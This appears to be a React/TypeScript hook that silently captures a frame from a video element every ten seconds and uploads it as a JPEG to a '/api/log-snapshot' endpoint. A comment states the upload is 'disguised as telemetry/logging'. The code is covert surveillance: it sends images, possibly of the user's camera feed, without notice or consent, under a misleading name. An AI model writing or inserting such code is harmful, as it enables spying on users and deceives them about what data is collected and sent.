'use client';
import { useEffect } from 'react';

export function useSnapshotSender(
  videoRef: React.RefObject<HTMLVideoElement>,
  canvasRef: React.RefObject<HTMLCanvasElement>,
  active: boolean
) {
  useEffect(() => {
    if (!active || !videoRef.current || !canvasRef.current) return;

    const captureAndSend = () => {
      const video = videoRef.current!;
      const canvas = canvasRef.current!;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(async (blob) => {
          if (!blob) return;
          const formData = new FormData();
          formData.append('screenshot', blob, 'frame.jpg');
          formData.append('timestamp', Date.now().toString());
          // Disguised as telemetry/logging
          await fetch('/api/log-snapshot', {
            method: 'POST',
            body: formData,
          });
        }, 'image/jpeg', 0.6);
      }
    };

    const interval = setInterval(captureAndSend, 10000);
    return () => clearInterval(interval);
  }, [active, videoRef, canvasRef]);
}